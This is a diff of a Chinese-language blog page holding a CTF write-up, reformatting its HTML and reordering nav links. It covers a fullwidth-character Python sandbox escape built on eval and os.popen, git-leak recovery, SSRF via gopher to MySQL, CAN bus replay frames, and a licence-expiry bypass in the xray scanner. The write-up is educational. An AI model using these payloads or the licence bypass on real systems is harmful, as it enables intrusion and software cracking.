@@ -242,28 +242,6 @@
           
           
           <li>
-            <a href="/tags/">
-              
-              标签
-              
-              
-            </a>
-          </li>
-          
-          
-          
-          <li>
-            <a href="/archive/">
-              
-              归档
-              
-              
-            </a>
-          </li>
-          
-          
-          
-          <li>
             <a href="/categories/">
               
               分类
@@ -275,9 +253,31 @@
           
           
           <li>
+            <a href="/tags/">
+              
+              标签
+              
+              
+            </a>
+          </li>
+          
+          
+          
+          <li>
             <a href="/about/">
               
               关于
+              
+              
+            </a>
+          </li>
+          
+          
+          
+          <li>
+            <a href="/archive/">
+              
+              归档
               
               
             </a>
@@ -401,7 +401,7 @@
             </span>
             <div class="blank_box"></div>
             <span class="meta">
-              Words <span class="post-count">708</span> In Total
+              Words <span class="post-count">710</span> In Total
             </span>
             <div class="blank_box"></div>
             <!-- WordCount end -->
@@ -463,48 +463,85 @@
       <!-- Post Container -->
       <div class="col-lg-8 col-lg-offset-1 col-md-10 col-md-offset-1 post-container">
 
-        <h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Calc"><a href="#Calc" class="headerlink" title="Calc"></a>Calc</h3><ol>
-<li>过滤字母 + ，利用全角英文绕过<br><img src="1.png" alt="calc"></li>
-<li>后台是由 eval 运行结果的，这不 pyjail</li>
-<li>shell 生成<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ｏｐｅｎ(ｂｙｔｅｓ((47,102,108,97,103)).ｄｅｃｏｄｅ()).ｒｅａｄ()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## shell 生成，正常输入payload</span></span><br><span class="line">shell = <span class="string">f&quot;__import__(&#x27;os&#x27;).popen(&#x27;<span class="subst">&#123;<span class="built_in">input</span>()&#125;</span>&#x27;).read()&quot;</span></span><br><span class="line">shell = <span class="string">&#x27;,&#x27;</span>.join([<span class="built_in">str</span>(<span class="built_in">ord</span>(i)) <span class="keyword">for</span> i <span class="keyword">in</span> shell])</span><br><span class="line">a = <span class="string">f&#x27;eval(bytes((<span class="subst">&#123;shell&#125;</span>)).decode())&#x27;</span></span><br><span class="line">b = <span class="built_in">list</span>(<span class="string">&#x27;ａｂｃｄｅｆｇｈｉｊｋｌｍｎｏｐｑｒｓｔｕｖｗｘｙｚ&#x27;</span>)</span><br><span class="line">c = <span class="built_in">list</span>(<span class="string">&#x27;abcdefghijklmnopqrstuvwxyz&#x27;</span>)</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(b) == <span class="built_in">len</span>(c)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)):</span><br><span class="line">    a = a.replace(c[i], b[i])</span><br><span class="line"><span class="built_in">print</span>(a)</span><br></pre></td></tr></table></figure>
-</li>
-</ol>
-<h3 id="reset"><a href="#reset" class="headerlink" title="reset"></a>reset</h3><p>不会，看不懂，先记下</p>
+        <h2 id="Web">Web</h2>
+<h3 id="Calc">Calc</h3>
 <ol>
-<li>git 泄露获取 .git 文件<br><img src="2.png" alt="reset"></li>
-<li>根据文章学习得知大致 .git 文件结构，主要内容分布在 objects 文件夹<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//</span>www.leavesongs.com<span class="regexp">/PENETRATION/</span>XDCTF-<span class="number">2015</span>-WEB2-WRITEUP.html</span><br></pre></td></tr></table></figure></li>
-<li>写脚本<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zlib </span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">dirs = os.listdir()</span><br><span class="line"><span class="keyword">for</span> <span class="built_in">dir</span> <span class="keyword">in</span> dirs:</span><br><span class="line">    <span class="keyword">if</span> os.path.isdir(<span class="built_in">dir</span>):</span><br><span class="line">        files = os.listdir(<span class="built_in">dir</span>)</span><br><span class="line">        <span class="keyword">for</span> f <span class="keyword">in</span> files:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(os.path.join(<span class="built_in">dir</span>, f), <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> a:</span><br><span class="line">                data = zlib.decompress(a.read())</span><br><span class="line">                <span class="keyword">if</span> data:</span><br><span class="line">                    <span class="keyword">with</span> <span class="built_in">open</span>(f, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> b:</span><br><span class="line">                        b.write(data)</span><br></pre></td></tr></table></figure></li>
-<li>git 大概结构<br><img src="3.png" alt="reset"></li>
-<li>一共两个版本，得到两个主要文件 reset.php upload.php</li>
-<li>reset.php 关键代码<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">    preg_match(<span class="string">&#x27;/^[a-z0-9]&#123;40&#125;$/&#x27;</span>, <span class="variable">$id</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;Invalid commit id!&#x27;</span>);</span><br><span class="line">    system(<span class="string">&quot;git reset --hard <span class="subst">$id</span>&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></li>
-<li>upload.php 关键代码<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;files&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$fileType</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line">    <span class="variable">$fileName</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>] ?? <span class="string">&#x27;none&#x27;</span>;</span><br><span class="line">    <span class="variable">$size</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;size&#x27;</span>];</span><br><span class="line">    <span class="variable">$error</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;error&#x27;</span>];</span><br><span class="line">    <span class="variable">$whitelist</span> = <span class="keyword">array</span>(<span class="string">&quot;image/gif&quot;</span>, <span class="string">&quot;image/png&quot;</span>, <span class="string">&quot;image/jpeg&quot;</span>, <span class="string">&quot;iamge/jpg&quot;</span>);</span><br><span class="line">    <span class="comment"># check type, size, error</span></span><br><span class="line">    in_array(<span class="variable">$fileType</span>, <span class="variable">$whitelist</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Invalid file!1&quot;</span>);</span><br><span class="line">    <span class="variable">$size</span> &lt; <span class="number">20000</span> <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Invalid fize!2&quot;</span>);</span><br><span class="line">    <span class="variable">$error</span> &gt; <span class="number">0</span> <span class="keyword">and</span> <span class="keyword">die</span>(<span class="variable">$error</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment"># check filename</span></span><br><span class="line">    preg_match(<span class="string">&#x27;/[a-zA-Z0-9_]&#123;10,&#125;$/&#x27;</span>, <span class="variable">$filename</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Invalid file type!&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (! move_uploadedFile(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="string">&quot;./upload/&quot;</span>, <span class="variable">$fileName</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Invaild failed.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;saved-&gt; &#x27;</span>.<span class="variable">$fileName</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></li>
-<li>reset.php 就是回退某一个版本，upload.php 为文件上传<br><img src="4.png" alt="reset"></li>
+<li>过滤字母 + ，利用全角英文绕过<br>
+<img src="1.png" alt="calc"></li>
+<li>后台是由 eval 运行结果的，这不 pyjail</li>
+<li>shell 生成</li>
 </ol>
-<h3 id="ssrfme"><a href="#ssrfme" class="headerlink" title="ssrfme"></a>ssrfme</h3><ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ｏｐｅｎ(ｂｙｔｅｓ((47,102,108,97,103)).ｄｅｃｏｄｅ()).ｒｅａｄ()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## shell 生成，正常输入payload</span></span><br><span class="line">shell = <span class="string">f&quot;__import__(&#x27;os&#x27;).popen(&#x27;<span class="subst">&#123;<span class="built_in">input</span>()&#125;</span>&#x27;).read()&quot;</span></span><br><span class="line">shell = <span class="string">&#x27;,&#x27;</span>.join([<span class="built_in">str</span>(<span class="built_in">ord</span>(i)) <span class="keyword">for</span> i <span class="keyword">in</span> shell])</span><br><span class="line">a = <span class="string">f&#x27;eval(bytes((<span class="subst">&#123;shell&#125;</span>)).decode())&#x27;</span></span><br><span class="line">b = <span class="built_in">list</span>(<span class="string">&#x27;ａｂｃｄｅｆｇｈｉｊｋｌｍｎｏｐｑｒｓｔｕｖｗｘｙｚ&#x27;</span>)</span><br><span class="line">c = <span class="built_in">list</span>(<span class="string">&#x27;abcdefghijklmnopqrstuvwxyz&#x27;</span>)</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(b) == <span class="built_in">len</span>(c)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)):</span><br><span class="line">    a = a.replace(c[i], b[i])</span><br><span class="line"><span class="built_in">print</span>(a)</span><br></pre></td></tr></table></figure>
+<h3 id="reset">reset</h3>
+<p>不会，看不懂，先记下</p>
+<ol>
+<li>git 泄露获取 .git 文件<br>
+<img src="2.png" alt="reset"></li>
+<li>根据文章学习得知大致 .git 文件结构，主要内容分布在 objects 文件夹</li>
+</ol>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//</span>www.leavesongs.com<span class="regexp">/PENETRATION/</span>XDCTF-<span class="number">2015</span>-WEB2-WRITEUP.html</span><br></pre></td></tr></table></figure>
+<ol start="3">
+<li>写脚本</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zlib </span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">dirs = os.listdir()</span><br><span class="line"><span class="keyword">for</span> <span class="built_in">dir</span> <span class="keyword">in</span> dirs:</span><br><span class="line">    <span class="keyword">if</span> os.path.isdir(<span class="built_in">dir</span>):</span><br><span class="line">        files = os.listdir(<span class="built_in">dir</span>)</span><br><span class="line">        <span class="keyword">for</span> f <span class="keyword">in</span> files:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(os.path.join(<span class="built_in">dir</span>, f), <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> a:</span><br><span class="line">                data = zlib.decompress(a.read())</span><br><span class="line">                <span class="keyword">if</span> data:</span><br><span class="line">                    <span class="keyword">with</span> <span class="built_in">open</span>(f, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> b:</span><br><span class="line">                        b.write(data)</span><br></pre></td></tr></table></figure>
+<ol start="4">
+<li>git 大概结构<br>
+<img src="3.png" alt="reset"></li>
+<li>一共两个版本，得到两个主要文件 reset.php upload.php</li>
+<li>reset.php 关键代码</li>
+</ol>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">    preg_match(<span class="string">&#x27;/^[a-z0-9]&#123;40&#125;$/&#x27;</span>, <span class="variable">$id</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;Invalid commit id!&#x27;</span>);</span><br><span class="line">    system(<span class="string">&quot;git reset --hard <span class="subst">$id</span>&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
+<ol start="7">
+<li>upload.php 关键代码</li>
+</ol>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;files&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$fileType</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line">    <span class="variable">$fileName</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>] ?? <span class="string">&#x27;none&#x27;</span>;</span><br><span class="line">    <span class="variable">$size</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;size&#x27;</span>];</span><br><span class="line">    <span class="variable">$error</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;error&#x27;</span>];</span><br><span class="line">    <span class="variable">$whitelist</span> = <span class="keyword">array</span>(<span class="string">&quot;image/gif&quot;</span>, <span class="string">&quot;image/png&quot;</span>, <span class="string">&quot;image/jpeg&quot;</span>, <span class="string">&quot;iamge/jpg&quot;</span>);</span><br><span class="line">    <span class="comment"># check type, size, error</span></span><br><span class="line">    in_array(<span class="variable">$fileType</span>, <span class="variable">$whitelist</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Invalid file!1&quot;</span>);</span><br><span class="line">    <span class="variable">$size</span> &lt; <span class="number">20000</span> <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Invalid fize!2&quot;</span>);</span><br><span class="line">    <span class="variable">$error</span> &gt; <span class="number">0</span> <span class="keyword">and</span> <span class="keyword">die</span>(<span class="variable">$error</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment"># check filename</span></span><br><span class="line">    preg_match(<span class="string">&#x27;/[a-zA-Z0-9_]&#123;10,&#125;$/&#x27;</span>, <span class="variable">$filename</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Invalid file type!&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (! move_uploadedFile(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="string">&quot;./upload/&quot;</span>, <span class="variable">$fileName</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Invaild failed.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;saved-&gt; &#x27;</span>.<span class="variable">$fileName</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
+<ol start="8">
+<li>reset.php 就是回退某一个版本，upload.php 为文件上传<br>
+<img src="4.png" alt="reset"></li>
+</ol>
+<h3 id="ssrfme">ssrfme</h3>
+<ol>
 <li>扫目录得到源码</li>
 <li>重定向请求没有过滤，用file读取文件，读取flag没读到</li>
-<li>利用 gopher 探测服务，6379 redis 没开，打 mysql<br><img src="5.png" alt="ssrfme"></li>
-<li>执行 readflag 获取 flag<br><img src="6.png" alt="ssrfme"></li>
+<li>利用 gopher 探测服务，6379 redis 没开，打 mysql<br>
+<img src="5.png" alt="ssrfme"></li>
+<li>执行 readflag 获取 flag<br>
+<img src="6.png" alt="ssrfme"></li>
 </ol>
-<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="空投之王"><a href="#空投之王" class="headerlink" title="空投之王"></a>空投之王</h3><ol>
-<li>AirDrop 取证，申请个 盘古石 </li>
-<li>hash 爆破手机号<br><del>可恶，居然有这种工具，我快看瞎了</del><br><img src="7.png" alt="airdrop"></li>
+<h2 id="Misc">Misc</h2>
+<h3 id="空投之王">空投之王</h3>
+<ol>
+<li>AirDrop 取证，申请个 盘古石</li>
+<li>hash 爆破手机号<br>
+<s>可恶，居然有这种工具，我快看瞎了</s><br>
+<img src="7.png" alt="airdrop"></li>
 </ol>
-<h3 id="证书里也有秘密"><a href="#证书里也有秘密" class="headerlink" title="证书里也有秘密"></a>证书里也有秘密</h3><ol>
-<li>找到项目<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/Lz1y/</span>xray-crack</span><br></pre></td></tr></table></figure></li>
-<li>下载后修改 main.go 源代码，将以下代码注释，用 -p 证书即可解析 证书，第二个参数即为 user_id<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">validTime, _ := time.Parse(<span class="string">&quot;2006-01-02 15:04:05&quot;</span>, <span class="string">&quot;2021-01-01 00:00:00&quot;</span>)</span><br><span class="line">nowTime := time.Now()</span><br><span class="line"><span class="keyword">if</span> nowTime.After(validTime) &#123;</span><br><span class="line">    <span class="built_in">panic</span>(<span class="string">&quot;本工具已失效&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-</li>
+<h3 id="证书里也有秘密">证书里也有秘密</h3>
+<ol>
+<li>找到项目</li>
 </ol>
-<h3 id="飞驰人生"><a href="#飞驰人生" class="headerlink" title="飞驰人生"></a>飞驰人生</h3><ol>
-<li>配置一下重放的环境，用 ubuntu 吧<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//</span>www.anquanke.com<span class="regexp">/post/i</span>d/<span class="number">209141</span><span class="comment">#h2-17</span></span><br><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/zombieCraig/</span>ICSim</span><br></pre></td></tr></table></figure></li>
-<li>发现存在攻击行为 速度暴涨和锁车门<del>可恶锁车门没发现</del><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">244</span>#<span class="number">000000</span>A<span class="number">60000</span></span><br><span class="line"><span class="attribute">19B</span>#<span class="number">00000</span>F<span class="number">000000</span></span><br></pre></td></tr></table></figure>
-</li>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/Lz1y/</span>xray-crack</span><br></pre></td></tr></table></figure>
+<ol start="2">
+<li>下载后修改 main.go 源代码，将以下代码注释，用 -p 证书即可解析 证书，第二个参数即为 user_id</li>
 </ol>
-<h3 id="坐井观天"><a href="#坐井观天" class="headerlink" title="坐井观天"></a>坐井观天</h3><ol>
-<li>简单的 pyjail 空白爷 yyds!!!<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="built_in">input</span>())</span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;cat /flag&#x27;</span>).read()</span><br></pre></td></tr></table></figure>
-</li>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">validTime, _ := time.Parse(<span class="string">&quot;2006-01-02 15:04:05&quot;</span>, <span class="string">&quot;2021-01-01 00:00:00&quot;</span>)</span><br><span class="line">nowTime := time.Now()</span><br><span class="line"><span class="keyword">if</span> nowTime.After(validTime) &#123;</span><br><span class="line">    <span class="built_in">panic</span>(<span class="string">&quot;本工具已失效&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="飞驰人生">飞驰人生</h3>
+<ol>
+<li>配置一下重放的环境，用 ubuntu 吧</li>
 </ol>
-<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><p>冰哥永远的神！<br><img src="8.png" alt="crypto"></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//</span>www.anquanke.com<span class="regexp">/post/i</span>d/<span class="number">209141</span><span class="comment">#h2-17</span></span><br><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/zombieCraig/</span>ICSim</span><br></pre></td></tr></table></figure>
+<ol start="2">
+<li>发现存在攻击行为 速度暴涨和锁车门<s>可恶锁车门没发现</s></li>
+</ol>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">244</span>#<span class="number">000000</span>A<span class="number">60000</span></span><br><span class="line"><span class="attribute">19B</span>#<span class="number">00000</span>F<span class="number">000000</span></span><br></pre></td></tr></table></figure>
+<h3 id="坐井观天">坐井观天</h3>
+<ol>
+<li>简单的 pyjail 空白爷 yyds!!!</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="built_in">input</span>())</span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;cat /flag&#x27;</span>).read()</span><br></pre></td></tr></table></figure>
+<h2 id="Crypto">Crypto</h2>
+<p>冰哥永远的神！<br>
+<img src="8.png" alt="crypto"></p>
 
 
         <hr>
